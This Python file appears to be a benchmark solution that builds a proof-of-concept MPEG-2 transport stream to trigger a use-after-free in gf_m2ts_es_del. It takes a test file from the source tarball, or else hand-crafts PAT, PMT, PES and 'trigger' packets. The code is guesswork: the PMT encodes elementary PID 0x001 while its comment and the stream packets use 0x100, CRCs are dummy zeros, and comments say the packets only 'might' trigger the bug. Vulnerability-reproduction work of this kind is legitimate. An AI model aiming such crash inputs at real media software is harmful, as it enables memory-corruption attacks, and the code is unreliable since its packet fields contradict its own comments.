import os
import tempfile
import tarfile
import shutil
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First try to find existing test cases in the source
        poc = self._find_existing_poc(src_path)
        if poc:
            return poc
        
        # If not found, generate a minimal M2TS file that triggers the vulnerability
        # Based on the vulnerability description (gf_m2ts_es_del use-after-free)
        # We need to create an M2TS stream that causes elementary stream deletion
        # followed by access to freed memory
        
        # M2TS packets are 188 bytes each, starting with 0x47 sync byte
        # We'll create packets with various PIDs to trigger ES creation and deletion
        
        poc_data = bytearray()
        
        # Create PAT (Program Association Table) - PID 0
        # This is required for valid M2TS
        pat_packet = self._create_pat_packet()
        poc_data.extend(pat_packet)
        
        # Create PMT (Program Map Table) - PID 16
        # This creates an elementary stream
        pmt_packet = self._create_pmt_packet()
        poc_data.extend(pmt_packet)
        
        # Create multiple elementary stream packets with PID 256
        # These will create ES objects that get freed
        for i in range(5):
            es_packet = self._create_pes_packet(pid=256, counter=i)
            poc_data.extend(es_packet)
        
        # Create adaptation field packets to trigger special handling
        # that might cause use-after-free
        for i in range(5):
            af_packet = self._create_adaptation_field_packet(pid=256, counter=i+5)
            poc_data.extend(af_packet)
        
        # Create packets that reference deleted ES
        # This should trigger the use-after-free
        for i in range(10):
            trigger_packet = self._create_trigger_packet(pid=256, counter=i+10)
            poc_data.extend(trigger_packet)
        
        # Add null packets to reach target size
        while len(poc_data) < 1128:
            null_packet = self._create_null_packet()
            poc_data.extend(null_packet)
        
        # Trim to exactly 1128 bytes
        return bytes(poc_data[:1128])
    
    def _find_existing_poc(self, src_path: str) -> bytes:
        """Try to find existing test cases in the source tarball."""
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                # Look for test files that might contain PoCs
                test_files = []
                for member in tar.getmembers():
                    if member.name.endswith(('.ts', '.m2ts', '.test', '.poc')):
                        test_files.append(member)
                
                # Try to extract and use the first test file we find
                if test_files:
                    with tempfile.TemporaryDirectory() as tmpdir:
                        tar.extract(test_files[0], path=tmpdir)
                        test_file = os.path.join(tmpdir, test_files[0].name)
                        with open(test_file, 'rb') as f:
                            data = f.read()
                            if len(data) > 0:
                                return data[:1128]  # Trim to target size
        except:
            pass
        return None
    
    def _create_pat_packet(self) -> bytes:
        """Create a Program Association Table packet (PID 0)."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x40  # PID high byte (0x00), payload start
        packet[2] = 0x00  # PID low byte
        packet[3] = 0x10  # No adaptation, continuity counter 0
        
        # PAT payload
        packet[4] = 0x00  # Pointer field
        packet[5] = 0x00  # Table ID (PAT)
        packet[6] = 0xB0  # Section length high (0x0D)
        packet[7] = 0x0D  # Section length low
        packet[8] = 0x00  # TS ID high
        packet[9] = 0x01  # TS ID low
        packet[10] = 0xC1  # Version, current
        packet[11] = 0x00  # Section number
        packet[12] = 0x00  # Last section number
        packet[13] = 0x00  # Program number high
        packet[14] = 0x01  # Program number low
        packet[15] = 0xE0  # PMT PID high (0x10)
        packet[16] = 0x10  # PMT PID low
        
        # CRC (dummy)
        packet[17] = 0x00
        packet[18] = 0x00
        packet[19] = 0x00
        packet[20] = 0x00
        
        # Fill rest with 0xFF
        for i in range(21, 188):
            packet[i] = 0xFF
        
        return packet
    
    def _create_pmt_packet(self) -> bytes:
        """Create a Program Map Table packet (PID 16)."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x40  # PID high byte (0x10), payload start
        packet[2] = 0x10  # PID low byte
        packet[3] = 0x10  # No adaptation, continuity counter 0
        
        # PMT payload
        packet[4] = 0x00  # Pointer field
        packet[5] = 0x02  # Table ID (PMT)
        packet[6] = 0xB0  # Section length high (0x17)
        packet[7] = 0x17  # Section length low
        packet[8] = 0x00  # Program number high
        packet[9] = 0x01  # Program number low
        packet[10] = 0xC1  # Version, current
        packet[11] = 0x00  # Section number
        packet[12] = 0x00  # Last section number
        packet[13] = 0xE0  # PCR PID high (0x00)
        packet[14] = 0x00  # PCR PID low
        packet[15] = 0xF0  # Program info length high
        packet[16] = 0x00  # Program info length low
        
        # Elementary stream (H.264 video)
        packet[17] = 0x1B  # Stream type
        packet[18] = 0xE0  # Elementary PID high (0x100)
        packet[19] = 0x01  # Elementary PID low
        packet[20] = 0xF0  # ES info length high
        packet[21] = 0x00  # ES info length low
        
        # CRC (dummy)
        packet[22] = 0x00
        packet[23] = 0x00
        packet[24] = 0x00
        packet[25] = 0x00
        
        # Fill rest with 0xFF
        for i in range(26, 188):
            packet[i] = 0xFF
        
        return packet
    
    def _create_pes_packet(self, pid: int, counter: int) -> bytes:
        """Create a PES packet for an elementary stream."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = (pid >> 8) & 0x1F | 0x40  # PID high, payload start
        packet[2] = pid & 0xFF  # PID low
        packet[3] = 0x10 | (counter & 0x0F)  # No adaptation, continuity counter
        
        # PES header
        packet[4] = 0x00  # PES start code prefix
        packet[5] = 0x00
        packet[6] = 0x01
        packet[7] = 0xE0  # Stream ID (video)
        
        # PES packet length (0 = unbounded)
        packet[8] = 0x00
        packet[9] = 0x00
        
        # PES header flags
        packet[10] = 0x80  # PES scrambling control, priority, alignment
        packet[11] = 0xC0  # Copyright, original, flags
        
        # PES header data length
        packet[12] = 0x0A
        
        # PTS/DTS flags
        packet[13] = 0x80  # PTS only
        
        # PTS
        packet[14] = 0x21 | ((counter << 4) & 0x10)
        packet[15] = (counter << 6) & 0xC0
        packet[16] = 0x01
        packet[17] = 0x00
        packet[18] = 0x01
        
        # Fill with pattern that might trigger the bug
        pattern = bytes([0x00, 0x00, 0x00, 0x01, 0x09, 0x10])  # NAL unit start
        for i in range(19, min(188, 19 + len(pattern))):
            packet[i] = pattern[i - 19]
        
        # Fill rest with incrementing pattern
        for i in range(25, 188):
            packet[i] = (i + counter) & 0xFF
        
        return packet
    
    def _create_adaptation_field_packet(self, pid: int, counter: int) -> bytes:
        """Create a packet with adaptation field."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = (pid >> 8) & 0x1F | 0x40  # PID high, payload start
        packet[2] = pid & 0xFF  # PID low
        packet[3] = 0x30 | (counter & 0x0F)  # Adaptation field only, continuity counter
        
        # Adaptation field length
        packet[4] = 0x07  # 7 bytes of adaptation field
        
        # Adaptation field flags
        packet[5] = 0x10  # PCR flag set
        
        # PCR
        packet[6] = (counter >> 25) & 0xFF
        packet[7] = (counter >> 17) & 0xFF
        packet[8] = (counter >> 9) & 0xFF
        packet[9] = (counter >> 1) & 0xFF
        packet[10] = ((counter & 0x01) << 7) | 0x7E
        packet[11] = 0x00
        
        # Stuffing bytes
        for i in range(12, 188):
            packet[i] = 0xFF
        
        return packet
    
    def _create_trigger_packet(self, pid: int, counter: int) -> bytes:
        """Create packet that triggers use-after-free."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = (pid >> 8) & 0x1F  # PID high, no payload start
        packet[2] = pid & 0xFF  # PID low
        packet[3] = 0x10 | (counter & 0x0F)  # No adaptation, continuity counter
        
        # Create malformed PES to trigger ES handling
        # This might cause the ES to be deleted and then accessed
        packet[4] = 0x00
        packet[5] = 0x00
        packet[6] = 0x01  # Start code prefix
        
        # Use stream ID that might trigger special handling
        stream_id = 0xBD  # Private stream 1 (often used for AC3 audio)
        if counter % 3 == 0:
            stream_id = 0xC0  # Audio stream
        elif counter % 3 == 1:
            stream_id = 0xE0  # Video stream
        
        packet[7] = stream_id
        
        # Variable PES packet length to create different code paths
        pes_length = 0
        if counter % 2 == 0:
            pes_length = 0  # Unbounded
        else:
            pes_length = 100 + counter
        
        packet[8] = (pes_length >> 8) & 0xFF
        packet[9] = pes_length & 0xFF
        
        # Set PES header flags to trigger different parsing paths
        packet[10] = 0x80  # Standard flags
        packet[11] = 0x80 | ((counter % 4) << 4)  # Varying flags
        
        # Add some data that might trigger the bug
        for i in range(12, 188):
            # Create pattern that might look like valid data but causes issues
            if i < 50:
                packet[i] = (i + counter * 3) & 0xFF
            else:
                packet[i] = 0xFF
        
        return packet
    
    def _create_null_packet(self) -> bytes:
        """Create a null packet (PID 0x1FFF)."""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x1F  # PID high (0x1FFF)
        packet[2] = 0xFF  # PID low
        packet[3] = 0x10  # No adaptation
        
        # Fill with 0xFF
        for i in range(4, 188):
            packet[i] = 0xFF
        
        return packet